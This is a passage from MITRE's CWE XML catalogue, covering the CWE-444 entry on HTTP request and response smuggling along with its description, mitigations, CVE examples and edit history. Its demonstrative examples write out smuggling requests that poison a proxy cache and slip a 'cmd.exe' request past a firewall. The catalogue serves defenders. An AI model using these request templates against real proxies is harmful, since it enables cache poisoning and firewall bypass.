               <ns0:Modification_Comment>updated Potential_Mitigations</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2010-09-27</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Observed_Examples, Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2010-12-13</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Alternate_Terms, Common_Consequences, Description, Observed_Examples, Other_Notes, Potential_Mitigations, Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2011-03-29</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Description</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2011-06-01</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Common_Consequences</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2011-06-27</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Demonstrative_Examples</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2011-09-13</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Relationships, Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2012-05-11</ns0:Modification_Date>
               <ns0:Modification_Comment>updated References, Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2014-07-30</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Relationships, Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2015-12-07</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-11-08</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Demonstrative_Examples, Relationships, Taxonomy_Mappings, White_Box_Definitions</ns0:Modification_Comment>
            </ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2019-01-03</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Relationships</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2019-06-20</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Relationships, Type</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2019-09-19</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Relationships</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2020-02-24</ns0:Modification_Date>
					<ns0:Modification_Comment>updated References, Relationships, Taxonomy_Mappings</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2020-06-25</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Relationships</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2020-08-20</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Relationships</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2020-12-10</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Relationships</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2021-07-20</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Relationships</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2022-06-28</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Observed_Examples, Relationships</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2022-10-13</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Description, Relationships, Taxonomy_Mappings</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2023-04-27</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Detection_Factors, Relationships, Time_of_Introduction</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2023-06-29</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Mapping_Notes, Relationships</ns0:Modification_Comment>
				</ns0:Modification>
            <ns0:Contribution Type="Feedback">
               <ns0:Contribution_Name>Anonymous External Contributor</ns0:Contribution_Name>
               <ns0:Contribution_Date>2022-06-28</ns0:Contribution_Date>
               <ns0:Contribution_Comment>Suggested rephrase for extended description</ns0:Contribution_Comment>
            </ns0:Contribution>
         </ns0:Content_History>
      </ns0:Weakness>
      <ns0:Weakness ID="444" Name="Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling')" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <ns0:Description>The product acts as an intermediary HTTP agent
         (such as a proxy or firewall) in the data flow between two
         entities such as a client and server, but it does not
         interpret malformed HTTP requests or responses in ways that
         are consistent with how the messages will be processed by
         those entities that are at the ultimate destination.</ns0:Description>
         <ns0:Extended_Description>
	   <html:p>HTTP requests or responses ("messages") can be
	   malformed or unexpected in ways that cause web servers or
	   clients to interpret the messages in different ways than
	   intermediary HTTP agents such as load balancers, reverse
	   proxies, web caching proxies, application firewalls,
	   etc. For example, an adversary may be able to add duplicate
	   or different header fields that a client or server might
	   interpret as one set of messages, whereas the intermediary
	   might interpret the same sequence of bytes as a different
	   set of messages. For example, discrepancies can arise in
	   how to handle duplicate headers like two Transfer-encoding
	   (TE) or two Content-length (CL), or the malicious HTTP
	   message will have different headers for TE and
	   CL.</html:p>
	   <html:p>The inconsistent parsing and interpretation of messages
	   can allow the adversary to "smuggle" a message to the
	   client/server without the intermediary being aware of it.</html:p>
	   <html:p>This weakness is usually the result of the usage
	   of outdated or incompatible HTTP protocol versions in the
	   HTTP agents.</html:p>
         </ns0:Extended_Description>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness Nature="ChildOf" CWE_ID="436" View_ID="1000" Ordinal="Primary" />
            <ns0:Related_Weakness Nature="ChildOf" CWE_ID="436" View_ID="1003" Ordinal="Primary" />
         </ns0:Related_Weaknesses>
         <ns0:Applicable_Platforms>
            <ns0:Language Class="Not Language-Specific" Prevalence="Undetermined" />
            <ns0:Technology Class="Web Based" Prevalence="Undetermined" />
         </ns0:Applicable_Platforms>
         <ns0:Alternate_Terms>
            <ns0:Alternate_Term>
               <ns0:Term>HTTP Request Smuggling</ns0:Term>
            </ns0:Alternate_Term>
            <ns0:Alternate_Term>
               <ns0:Term>HTTP Response Smuggling</ns0:Term>
            </ns0:Alternate_Term>
            <ns0:Alternate_Term>
               <ns0:Term>HTTP Smuggling</ns0:Term>
            </ns0:Alternate_Term>
         </ns0:Alternate_Terms>
         <ns0:Modes_Of_Introduction>
            <ns0:Introduction>
               <ns0:Phase>Implementation</ns0:Phase>
            </ns0:Introduction>
         </ns0:Modes_Of_Introduction>
         <ns0:Common_Consequences>
            <ns0:Consequence>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Scope>Non-Repudiation</ns0:Scope>
               <ns0:Scope>Access Control</ns0:Scope>
               <ns0:Impact>Unexpected State</ns0:Impact>
               <ns0:Impact>Hide Activities</ns0:Impact>
               <ns0:Impact>Bypass Protection Mechanism</ns0:Impact>
               <ns0:Note>An attacker could create HTTP messages to exploit a number of weaknesses including 1) the message can trick the web server to associate a URL with another URL's webpage and caching the contents of the webpage (web cache poisoning attack), 2) the message can be structured to bypass the firewall protection mechanisms and gain unauthorized access to a web application, and 3) the message can invoke a script or a page that returns client credentials (similar to a Cross Site Scripting attack).</ns0:Note>
            </ns0:Consequence>
         </ns0:Common_Consequences>
         <ns0:Potential_Mitigations>
            <ns0:Mitigation>
               <ns0:Phase>Implementation</ns0:Phase>
               <ns0:Description>Use a web server that employs a strict HTTP parsing procedure, such as Apache [REF-433].</ns0:Description>
            </ns0:Mitigation>
            <ns0:Mitigation>
               <ns0:Phase>Implementation</ns0:Phase>
               <ns0:Description>Use only SSL communication.</ns0:Description>
            </ns0:Mitigation>
            <ns0:Mitigation>
               <ns0:Phase>Implementation</ns0:Phase>
               <ns0:Description>Terminate the client session after each request.</ns0:Description>
            </ns0:Mitigation>
            <ns0:Mitigation>
               <ns0:Phase>System Configuration</ns0:Phase>
               <ns0:Description>Turn all pages to non-cacheable.</ns0:Description>
            </ns0:Mitigation>
         </ns0:Potential_Mitigations>
         <ns0:Demonstrative_Examples>
            <ns0:Demonstrative_Example>
               <ns0:Intro_Text>In the following example, a malformed HTTP request is sent to a website that includes a proxy server and a web server with the intent of poisoning the cache to associate one webpage with another malicious webpage.</ns0:Intro_Text>
               <ns0:Example_Code Nature="Attack">
                  POST http://www.website.com/foobar.html HTTP/1.1<html:br />
		 Host: www.website.com<html:br />
		 Connection: Keep-Alive<html:br />
		 Content-Type: application/x-www-form-urlencoded<html:br />
		 Content-Length: 0<html:br />
		 Content-Length: 54<html:br />
		 <html:br />
                 GET /poison.html HTTP/1.1<html:br />
		 Host: www.website.com<html:br />
		 Bla: GET http://www.website.com/page_to_poison.html HTTP/1.1<html:br />
		 Host: www.website.com<html:br />
		 Connection: Keep-Alive<html:br />
               </ns0:Example_Code>
               <ns0:Body_Text>When this request is sent to the proxy server, the proxy server parses the first four lines of the POST request and encounters the two "Content-Length" headers. The proxy server ignores the first header, so it assumes the request has a body of length 54 bytes. Therefore, it treats the data in the next three lines that contain exactly 54 bytes as the first request's body:</ns0:Body_Text>
	       <ns0:Example_Code Nature="Result">
		GET /poison.html HTTP/1.1<html:br />
		Host: www.website.com<html:br />
		Bla:<html:br />
	       </ns0:Example_Code>
	       <ns0:Body_Text>The proxy then parses the remaining bytes, which it treats as the client's second request:</ns0:Body_Text>
	       <ns0:Example_Code Nature="Attack">
		GET http://www.website.com/page_to_poison.html HTTP/1.1<html:br />
		Host: www.website.com<html:br />
		Connection: Keep-Alive<html:br />
	       </ns0:Example_Code>
               <ns0:Body_Text>The original request is forwarded by the proxy server to the web server. Unlike the proxy, the web server uses the first "Content-Length" header and considers that the first POST request has no body.</ns0:Body_Text>
	       <ns0:Example_Code Nature="Attack">
		POST http://www.website.com/foobar.html HTTP/1.1<html:br />
		Host: www.website.com<html:br />
		Connection: Keep-Alive<html:br />
		Content-Type: application/x-www-form-urlencoded<html:br />
		Content-Length: 0<html:br />
		<html:i>Content-Length: 54 (ignored by server)</html:i><html:br />
	       </ns0:Example_Code>
	       <ns0:Body_Text>Because the web server has assumed the original POST request was length 0, it parses the second request that follows, i.e. for GET /poison.html:</ns0:Body_Text>
	       <ns0:Example_Code Nature="Attack">
		GET /poison.html HTTP/1.1<html:br />
		Host: www.website.com<html:br />
		Bla: GET http://www.website.com/page_to_poison.html HTTP/1.1<html:br />
		Host: www.website.com<html:br />
		Connection: Keep-Alive<html:br />
	       </ns0:Example_Code>
	       <ns0:Body_Text>Note that the "Bla:" header is treated as a regular header, so it is not parsed as a separate GET request.</ns0:Body_Text>
               <ns0:Body_Text>The requests the web server sees are "POST /foobar.html" and "GET /poison.html", so it sends back two responses with the contents of the "foobar.html" page and the "poison.html" page, respectively. The proxy matches these responses to the two requests it thinks were sent by the client - "POST /foobar.html" and "GET /page_to_poison.html". If the response is cacheable, the proxy caches the contents of "poison.html" under the URL "page_to_poison.html", and the cache is poisoned! Any client requesting "page_to_poison.html" from the proxy would receive the "poison.html" page.</ns0:Body_Text>
               <ns0:Body_Text>When a website includes both a proxy server and a web server, some protection against this type of attack can be achieved by installing a web application firewall, or using a web server that includes a stricter HTTP parsing procedure or make all webpages non-cacheable.</ns0:Body_Text>
               <ns0:Body_Text>Additionally, if a web application includes a Java servlet for processing requests, the servlet can check for multiple "Content-Length" headers and if they are found the servlet can return an error response thereby preventing the poison page to be cached, as shown below.</ns0:Body_Text>
               <ns0:Example_Code Nature="Good" Language="Java">
                  <html:div>protected void processRequest(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
				  <html:div style="margin-left:1em;">
                    <html:div>
                      <html:br />
                      <html:i>// Set up response writer object</html:i>
                      <html:br />...<html:br />try {
					  <html:div style="margin-left:1em;">
						<html:div>
                          <html:i>// check for multiple content length headers</html:i>
                          <html:br />Enumeration contentLengthHeaders = request.getHeaders("Content-Length");
						  <html:br />int count = 0;
						  <html:br />while (contentLengthHeaders.hasMoreElements()) {
						  <html:div style="margin-left:1em;">count++;
						  </html:div>}
						  <html:br />if (count &gt; 1) {
						  <html:div style="margin-left:1em;">
							<html:i>// output error response</html:i>
							</html:div>}
							<html:br />else {
							<html:div style="margin-left:1em;">
							  <html:div>
								<html:i>// process request</html:i>
							  </html:div>
							  </html:div>}
							  <html:br />
                        </html:div>
                    </html:div>} catch (Exception ex) {...}</html:div>
					</html:div>}
				  </html:div>
               </ns0:Example_Code>
            </ns0:Demonstrative_Example>
            <ns0:Demonstrative_Example>
               <ns0:Intro_Text>In the following example, a malformed HTTP request is sent to a website that includes a web server with a firewall with the intent of bypassing the web server firewall to smuggle malicious code into the system.</ns0:Intro_Text>
               <ns0:Example_Code Nature="Attack">
                  <html:div>POST /page.asp HTTP/1.1<html:br />Host: www.website.com<html:br />Connection: Keep-Alive<html:br />Content-Length: 49223<html:br />
                     <html:br />zzz...zzz ["z" x 49152]<html:br />POST /page.asp HTTP/1.0<html:br />Connection: Keep-Alive<html:br />Content-Length: 30<html:br />
                     <html:br />POST /page.asp HTTP/1.0<html:br />Bla: POST /page.asp?cmd.exe HTTP/1.0<html:br />Connection: Keep-Alive</html:div>
               </ns0:Example_Code>
               <ns0:Body_Text>When this request is sent to the web server, the first POST request has a content-length of 49,223 bytes, and the firewall treats the line with 49,152 copies of "z" and the lines with an additional lines with 71 bytes as its body (49,152+71=49,223). The firewall then continues to parse what it thinks is the second request starting with the line with the third POST request.</ns0:Body_Text>
               <ns0:Body_Text>Note that there is no CRLF after the "Bla: " header so the POST in the line is parsed as the value of the "Bla:" header. Although the line contains the pattern identified with a worm ("cmd.exe"), it is not blocked, since it is considered part of a header value. Therefore, "cmd.exe" is smuggled through the firewall.</ns0:Body_Text>
               <ns0:Body_Text>When the request is passed through the firewall the web server the first request is ignored because the web server does not find an expected "Content-Type: application/x-www-form-urlencoded" header, and starts parsing the second request.</ns0:Body_Text>
               <ns0:Body_Text>This second request has a content-length of 30 bytes, which is exactly the length of the next two lines up to the space after the "Bla:" header. And unlike the firewall, the web server processes the final POST as a separate third request and the "cmd.exe" worm is smuggled through the firewall to the web server.</ns0:Body_Text>
               <ns0:Body_Text>To avoid this attack a Web server firewall product must be used that is designed to prevent this type of attack.</ns0:Body_Text>
            </ns0:Demonstrative_Example>
            <ns0:Demonstrative_Example>
               <ns0:Intro_Text>
		 The interpretation of HTTP responses can be manipulated if response headers include a space between the header name and colon, or if HTTP 1.1 headers are sent through a proxy configured for HTTP 1.0, allowing for HTTP response smuggling. This can be exploited in web browsers and other applications when used in combination with various proxy servers. For instance, the HTTP response interpreted by the front-end/client HTTP agent/entity - in this case the web browser - can interpret a single response from an adversary-compromised web server as being two responses from two different web sites. In the Example below, notice the extra space after the Content-Length and Set-Cookie headers.</ns0:Intro_Text>
               <ns0:Example_Code Nature="Attack">
		HTTP/1.1 200 OK<html:br />
		Date: Fri, 08 Aug 2016 08:12:31 GMT<html:br />
		Server: Apache (Unix)<html:br />
		Connection: Keep-Alive<html:br />
		Content-Encoding: gzip<html:br />
		Content-Type: text/html<html:br />
		<html:b>Content-Length :</html:b> 2345<html:br />
		Transfer-Encoding: chunked<html:br />
		<html:b>Set-Cookie :</html:b> token="Malicious Code"<html:br />
		<html:br />
		&lt;HTML&gt; ... "Malicious Code"<html:br />
               </ns0:Example_Code>
            </ns0:Demonstrative_Example>
         </ns0:Demonstrative_Examples>
         <ns0:Observed_Examples>
	   <ns0:Observed_Example>
	     <ns0:Reference>CVE-2022-24766</ns0:Reference>
	     <ns0:Description>SSL/TLS-capable proxy allows HTTP smuggling when used in tandem with HTTP/1.0 services, due to inconsistent interpretation and input sanitization of HTTP messages within the body of another message</ns0:Description>
	     <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2022-24766</ns0:Link>
	   </ns0:Observed_Example>
	   <ns0:Observed_Example>
	     <ns0:Reference>CVE-2021-37147</ns0:Reference>
	     <ns0:Description>Chain: caching proxy server has improper input validation (CWE-20) of headers, allowing HTTP response smuggling (CWE-444) using an "LF line ending"</ns0:Description>
	     <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2021-37147</ns0:Link>
	   </ns0:Observed_Example>
	   <ns0:Observed_Example>
	     <ns0:Reference>CVE-2020-8287</ns0:Reference>
	     <ns0:Description>Node.js platform allows request smuggling via two Transfer-Encoding headers</ns0:Description>
	     <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2020-8287</ns0:Link>
	   </ns0:Observed_Example>
	   <ns0:Observed_Example>
	     <ns0:Reference>CVE-2006-6276</ns0:Reference>
	     <ns0:Description>Web servers allow request smuggling via inconsistent HTTP headers.</ns0:Description>
	     <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2006-6276</ns0:Link>
	   </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2005-2088</ns0:Reference>
               <ns0:Description>HTTP server allows request smuggling with both a "Transfer-Encoding: chunked" header and a Content-Length header</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2005-2088</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2005-2089</ns0:Reference>
               <ns0:Description>HTTP server allows request smuggling with both a "Transfer-Encoding: chunked" header and a Content-Length header</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2005-2089</ns0:Link>
            </ns0:Observed_Example>
         </ns0:Observed_Examples>
         <ns0:Taxonomy_Mappings>
            <ns0:Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <ns0:Entry_Name>HTTP Request Smuggling</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
            <ns0:Taxonomy_Mapping Taxonomy_Name="WASC">
               <ns0:Entry_ID>26</ns0:Entry_ID>
               <ns0:Entry_Name>HTTP Request Smuggling</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
            <ns0:Taxonomy_Mapping Taxonomy_Name="WASC">
               <ns0:Entry_ID>27</ns0:Entry_ID>
               <ns0:Entry_Name>HTTP Response Smuggling</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
         </ns0:Taxonomy_Mappings>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern CAPEC_ID="273" />
            <ns0:Related_Attack_Pattern CAPEC_ID="33" />
         </ns0:Related_Attack_Patterns>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-433" />
            <ns0:Reference External_Reference_ID="REF-1273" />
            <ns0:Reference External_Reference_ID="REF-1274" />
            <ns0:Reference External_Reference_ID="REF-1275" />
            <ns0:Reference External_Reference_ID="REF-1276" />
            <ns0:Reference External_Reference_ID="REF-1277" />
            <ns0:Reference External_Reference_ID="REF-1278" />
         </ns0:References>
         <ns0:Mapping_Notes>
            <ns0:Usage>Allowed</ns0:Usage>
            <ns0:Rationale>This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.</ns0:Rationale>
            <ns0:Comments>Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.</ns0:Comments>
            <ns0:Reasons>
               <ns0:Reason Type="Acceptable-Use" />
            </ns0:Reasons>
         </ns0:Mapping_Notes>
         <ns0:Notes>
            <ns0:Note Type="Theoretical">Request smuggling can be performed due to a multiple interpretation error, where the target is an intermediary or monitor, via a consistency manipulation (Transfer-Encoding and Content-Length headers).</ns0:Note>
         </ns0:Notes>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>PLOVER</ns0:Submission_Name>
               <ns0:Submission_Date>2006-07-19</ns0:Submission_Date>
               <ns0:Submission_Version>Draft 3</ns0:Submission_Version>
               <ns0:Submission_ReleaseDate>2006-07-19</ns0:Submission_ReleaseDate>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>Eric Dalci</ns0:Modification_Name>
               <ns0:Modification_Organization>Cigital</ns0:Modification_Organization>
               <ns0:Modification_Date>2008-07-01</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Potential_Mitigations, Time_of_Introduction</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2008-09-08</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Name, Relationships, Other_Notes, Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2009-05-27</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Name, Related_Attack_Patterns</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2010-02-16</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2011-06-01</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Common_Consequences</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2012-05-11</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Common_Consequences, Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2012-10-30</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Demonstrative_Examples, Potential_Mitigations</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2014-06-23</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Other_Notes, Potential_Mitigations, Theoretical_Notes</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2014-07-30</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2015-12-07</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-11-08</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Applicable_Platforms</ns0:Modification_Comment>
            </ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2020-02-24</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Applicable_Platforms, Relationships</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2021-10-28</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Relationships</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2022-04-28</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Related_Attack_Patterns</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
				  <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
				  <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
				  <ns0:Modification_Date>2022-06-28</ns0:Modification_Date>
				  <ns0:Modification_Importance>Critical</ns0:Modification_Importance>
				  <ns0:Modification_Comment>Extended the abstraction of this entry to include both HTTP request and response smuggling.</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2022-06-28</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Alternate_Terms, Common_Consequences, Demonstrative_Examples, Description, Name, Observed_Examples, References, Taxonomy_Mappings</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2022-10-13</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Related_Attack_Patterns</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2023-04-27</ns0:Modification_Date>
					<ns0:Modification_Comment>updated References, Relationships, Time_of_Introduction</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2023-06-29</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Mapping_Notes</ns0:Modification_Comment>
				</ns0:Modification>
            <ns0:Previous_Entry_Name Date="2008-04-11">HTTP Request Smuggling</ns0:Previous_Entry_Name>
            <ns0:Previous_Entry_Name Date="2008-09-09">Interpretation Conflict in Web Traffic (aka 'HTTP Request Smuggling')</ns0:Previous_Entry_Name>
            <ns0:Previous_Entry_Name Date="2009-05-27">Inconsistent Interpretation of HTTP Requests (aka 'HTTP Request Smuggling')</ns0:Previous_Entry_Name>
